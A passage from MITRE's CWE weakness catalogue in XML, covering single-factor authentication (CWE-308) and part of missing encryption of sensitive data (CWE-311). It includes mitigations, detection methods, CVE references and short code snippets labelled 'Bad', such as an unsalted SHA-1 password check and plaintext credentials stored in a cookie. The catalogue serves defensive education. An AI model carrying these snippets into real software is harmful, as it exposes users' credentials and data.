               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Observed_Examples, Potential_Mitigations, References, Relationship_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-07-16</Modification_Date>
					<Modification_Version>4.15</Modification_Version>
					<Modification_ReleaseDate>2024-07-16</Modification_ReleaseDate>
					<Modification_Comment>updated Common_Consequences, Description, Diagram, Modes_of_Introduction, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
               <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
               <Contribution_Date>2023-04-25</Contribution_Date>
               <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
            </Contribution>
	    <Contribution Type="Content">
	      <Contribution_Name>Abhi Balakrishnan</Contribution_Name>
	      <Contribution_Date>2024-02-29</Contribution_Date>
	      <Contribution_Version>4.15</Contribution_Version>
	      <Contribution_ReleaseDate>2024-07-16</Contribution_ReleaseDate>
	      <Contribution_Comment>Provided diagram to improve CWE usability</Contribution_Comment>
	    </Contribution>
            <Previous_Entry_Name Date="2010-02-16">No Authentication for Critical Function</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="308" Name="Use of Single-factor Authentication" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The use of single-factor authentication can lead to unnecessary risk of compromise when compared with the benefits of a dual-factor authentication scheme.</Description>
         <Extended_Description>While the use of multiple authentication schemes is simply piling on more complexity on top of authentication, it is inestimably valuable to have such measures of redundancy. The use of weak, reused, and common passwords is rampant on the internet. Without the added protection of multiple authentication schemes, a single mistake can result in the compromise of an account. For this reason, if multiple schemes are possible and also easy to use, they should be implemented and required.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1390" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="654" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="309" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If the secret in a single-factor authentication scheme gets compromised, full authentication is possible.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use multiple independent authentication schemes, which ensures that -- if one of the methods is compromised -- the system itself is still likely safe from compromise.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-101">
               <Intro_Text>In both of these examples, a user is logged in if their given password matches a stored password:</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>unsigned char *check_passwd(char *plaintext) {<xhtml:div style="margin-left:1em;">ctext = simple_digest("sha1",plaintext,strlen(plaintext), ... );<xhtml:br/>
                        <xhtml:i>//Login if hash matches stored hash</xhtml:i>
                        <xhtml:br/>if (equal(ctext, secret_password())) {<xhtml:div style="margin-left:1em;">login_user();</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>String plainText = new String(plainTextIn);<xhtml:br/>MessageDigest encer = MessageDigest.getInstance("SHA");<xhtml:br/>encer.update(plainTextIn);<xhtml:br/>byte[] digest = password.digest();<xhtml:br/>
                     <xhtml:i>//Login if hash matches stored hash</xhtml:i>
                     <xhtml:br/>if (equal(digest,secret_password())) {<xhtml:div style="margin-left:1em;">login_user();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code relies exclusively on a password mechanism (CWE-309) using only one factor of authentication (CWE-308). If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also uses SHA-1, which is a weak hash (CWE-328).  It also does not use a salt (CWE-759).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
		 <Observed_Examples>
		   <Observed_Example>
			 <Reference>CVE-2022-35248</Reference>
			 <Description>Chat application skips validation when Central Authentication Service
			 (CAS) is enabled, effectively removing the second factor from
			 two-factor authentication</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2022-35248</Link>
		   </Observed_Example>
		 </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Using single-factor authentication</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="16"/>
            <Related_Attack_Pattern CAPEC_ID="49"/>
            <Related_Attack_Pattern CAPEC_ID="509"/>
            <Related_Attack_Pattern CAPEC_ID="55"/>
            <Related_Attack_Pattern CAPEC_ID="555"/>
            <Related_Attack_Pattern CAPEC_ID="560"/>
            <Related_Attack_Pattern CAPEC_ID="561"/>
            <Related_Attack_Pattern CAPEC_ID="565"/>
            <Related_Attack_Pattern CAPEC_ID="600"/>
            <Related_Attack_Pattern CAPEC_ID="644"/>
            <Related_Attack_Pattern CAPEC_ID="645"/>
            <Related_Attack_Pattern CAPEC_ID="652"/>
            <Related_Attack_Pattern CAPEC_ID="653"/>
            <Related_Attack_Pattern CAPEC_ID="70"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-18"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Using Single-factor Authentication</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="311" Name="Missing Encryption of Sensitive Data" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not encrypt sensitive or critical information before storage or transmission.</Description>
         <Extended_Description>The lack of proper data encryption passes up the guarantees of confidentiality, integrity, and accountability that properly implemented encryption conveys.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>If the application does not use a secure channel, such as SSL, to exchange sensitive information, it is possible for an attacker with access to the network traffic to sniff packets from the connection and uncover the data. This attack is not technically difficult, but does require physical access to some portion of the network over which the sensitive data travels. This access is usually somewhere near where the user is connected to the network (such as a colleague on the company network) but can be anywhere along the path from the user to the end server.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>Omitting the use of encryption in any program which transfers data over a network of any kind should be considered on par with delivering the data sent to each user on the local networks of both the sender and receiver. Worse, this omission allows for the injection of data into a stream of communication between two parties -- with no means for the victims to separate valid data from invalid. In this day of widespread network attacks and password collection sniffers, it is an unnecessary risk to omit encryption from the design of any system which might benefit from it.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>The characterizaton of sensitive data often requires domain-specific understanding, so manual methods are useful. However, manual efforts might not achieve desired code coverage within limited time constraints. Black box methods may produce artifacts (e.g. stored data or unencrypted network transfer) that require manual evaluation.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Analysis</Method>
               <Description>Automated measurement of the entropy of an input/output source may indicate the use or lack of encryption, but human analysis is still required to distinguish intentionally-unencrypted data (e.g. metadata) from sensitive data.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Network Sniffer</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Automated Monitored Execution</xhtml:li>
                           <xhtml:li>Man-in-the-middle attack tool</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Requirements</Phase>
               <Description>Clearly specify which data or resources are valuable enough that they should be protected by encryption. Require that any transmission or storage of this data/resource should use well-vetted encryption algorithms.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Ensure that encryption is properly integrated into the system design, including but not necessarily limited to:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>Encryption that is needed to store or transmit private data of the users of the system</xhtml:li>
                        <xhtml:li>Encryption that is needed to protect the system itself from unauthorized disclosure or tampering</xhtml:li>
                     </xhtml:ul>
                  <xhtml:p>Identify the separate needs and contexts for encryption:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>One-way (i.e., only the user or recipient needs to have the key). This can be achieved using public key cryptography, or other techniques in which the encrypting party (i.e., the product) does not need to have access to a private key.</xhtml:li>
                        <xhtml:li>Two-way (i.e., the encryption can be automatically performed on behalf of a user, but the key must be available so that the plaintext can be automatically recoverable by that user). This requires storage of the private key in a format that is recoverable only by the user (or perhaps by the operating system) in a way that cannot be recovered by others.</xhtml:li>
                     </xhtml:ul>
                  <xhtml:p>Using threat modeling or other techniques, assume that data can be compromised through a separate vulnerability or weakness, and determine where encryption will be most effective. Ensure that data that should be private is not being inadvertently exposed using weaknesses such as insecure permissions (CWE-732). [REF-7]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-24">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.</xhtml:p>
                  <xhtml:p>For example, US government systems require FIPS 140-2 certification.</xhtml:p>
                  <xhtml:p>Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.</xhtml:p>
                  <xhtml:p>Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-46">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
                  <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-33">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
               <Effectiveness_Notes>This makes it easier to spot places in the code where data is being used that is unencrypted.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-40">
               <Intro_Text>This code writes a user's login information to a cookie so the user does not have to login again later.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function persistLogin($username, $password){<xhtml:div style="margin-left:1em;">$data = array("username" =&gt; $username, "password"=&gt; $password);<xhtml:br/>setcookie ("userdata", $data);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (CWE-79) could allow an attacker to remotely copy the cookie.</Body_Text>
               <Body_Text>Also note this example code also exhibits Plaintext Storage in a Cookie (CWE-315).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-41">
               <Intro_Text>The following code attempts to establish a connection, read in a password, then store it to a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>server.sin_family = AF_INET; hp = gethostbyname(argv[1]);<xhtml:br/>if (hp==NULL) error("Unknown host");<xhtml:br/>memcpy( (char *)&amp;server.sin_addr,(char *)hp-&gt;h_addr,hp-&gt;h_length);<xhtml:br/>if (argc &lt; 3) port = 80;<xhtml:br/>else port = (unsigned short)atoi(argv[3]);<xhtml:br/>server.sin_port = htons(port);<xhtml:br/>if (connect(sock, (struct sockaddr *)&amp;server, sizeof server) &lt; 0) error("Connecting");<xhtml:br/>...<xhtml:br/>while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>write(dfd,password_buffer,n);<xhtml:br/>...<xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>While successful, the program does not encrypt the data before writing it to a buffer, possibly exposing it to unauthorized actors.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-42">
               <Intro_Text>The following code attempts to establish a connection to a site to communicate sensitive information.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">URL u = new URL("http://www.secret.example.org/");<xhtml:br/>HttpURLConnection hu = (HttpURLConnection) u.openConnection();<xhtml:br/>hu.setRequestMethod("PUT");<xhtml:br/>hu.connect();<xhtml:br/>OutputStream os = hu.getOutputStream();<xhtml:br/>hu.disconnect();</xhtml:div>}<xhtml:br/>catch (IOException e) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>//...</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Though a connection is successfully made, the connection is unencrypted and it is possible that all sensitive data sent to or received from the server will be read by unintended actors.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-2272</Reference>
               <Description>password and username stored in cleartext in a cookie</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2272</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1466</Reference>
               <Description>password stored in cleartext in a file with insecure permissions</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1466</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0152</Reference>
               <Description>chat program disables SSL in some circumstances even when the user says to use SSL.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0152</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1603</Reference>
               <Description>Chain: product uses an incorrect public exponent when generating an RSA key, which effectively disables the encryption</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1603</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0964</Reference>
               <Description>storage of unencrypted passwords in a database</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0964</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6157</Reference>
               <Description>storage of unencrypted passwords in a database</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6157</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6828</Reference>
               <Description>product stores a password in cleartext in memory</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6828</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1567</Reference>
